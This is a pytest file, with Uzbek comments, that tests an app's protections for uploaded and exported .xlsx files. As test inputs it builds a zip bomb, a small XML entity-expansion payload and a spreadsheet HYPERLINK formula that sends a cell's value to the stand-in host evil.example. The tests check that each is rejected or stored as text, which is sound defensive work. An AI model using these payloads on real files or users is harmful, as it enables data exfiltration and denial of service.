"""Yuklangan .xlsx himoyasi: zip-bomba, XML entity hujumi, qatorlar chegarasi."""

import zipfile
from io import BytesIO

import pytest
from openpyxl import Workbook

from app.services import xlsx_safety
from app.services.passport_updater import parse_passport_excel
from app.services.xlsx_safety import XlsxRejected, check_xlsx_archive, limit_rows, open_xlsx


def _xlsx(rows: list[list]) -> bytes:
    wb = Workbook()
    ws = wb.active
    for r in rows:
        ws.append(r)
    buf = BytesIO()
    wb.save(buf)
    return buf.getvalue()


def _replace_entry(content: bytes, name: str, data: bytes) -> bytes:
    src = zipfile.ZipFile(BytesIO(content))
    out = BytesIO()
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as dst:
        for info in src.infolist():
            dst.writestr(info.filename, data if info.filename == name else src.read(info))
    return out.getvalue()


_PASSPORT_ROWS = [["jshshir", "ps_ser", "ps_num"], ["12345678901234", "AB", "1234567"]]


def test_valid_xlsx_parses():
    rows, errors = parse_passport_excel(_xlsx(_PASSPORT_ROWS))
    assert errors == []
    assert rows == [{"jshshir": "12345678901234", "ps_ser": "AB", "ps_num": "1234567"}]


@pytest.mark.parametrize("content", [b"<html></html>" * 10, b"PK\x03\x04garbage" * 10])
def test_non_xlsx_rejected(content):
    with pytest.raises(XlsxRejected):
        check_xlsx_archive(content)


def test_zip_bomb_rejected_by_declared_size(monkeypatch):
    monkeypatch.setattr(xlsx_safety, "MAX_XLSX_UNCOMPRESSED_BYTES", 64 * 1024)
    # 10 MB nol — siqilgan holda ~10 KB
    bomb = _replace_entry(_xlsx(_PASSPORT_ROWS), "xl/worksheets/sheet1.xml", b"\0" * 10_000_000)
    assert len(bomb) < 100_000
    with pytest.raises(XlsxRejected):
        check_xlsx_archive(bomb)


def test_xml_entity_attack_rejected():
    import openpyxl.xml

    assert openpyxl.xml.DEFUSEDXML, "defusedxml o'rnatilmagan (requirements.txt)"
    laughs = (
        b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY a "aaaaaaaaaa">'
        b'<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]>'
        b'<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
        b'<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>&b;</t></is></c></row>'
        b"</sheetData></worksheet>"
    )
    content = _replace_entry(_xlsx(_PASSPORT_ROWS), "xl/worksheets/sheet1.xml", laughs)
    rows, errors = parse_passport_excel(content)
    assert rows == [] and errors


def test_row_limit():
    wb = open_xlsx(_xlsx([[i] for i in range(10)]))
    with pytest.raises(XlsxRejected):
        list(limit_rows(wb.active.iter_rows(values_only=True), max_rows=5))


def test_export_writes_formula_like_names_as_text():
    from datetime import datetime

    from app.services.student_export import build_students_xlsx

    evil = '=HYPERLINK("http://evil.example/?"&F4,"Batafsil")'
    content = build_students_xlsx([{"last_name": evil, "first_name": "ALI"}], datetime(2026, 10, 29))
    sheet = zipfile.ZipFile(BytesIO(content)).read("xl/worksheets/sheet1.xml").decode()
    assert "<f>" not in sheet
    assert "HYPERLINK" in sheet  # matn sifatida saqlangan
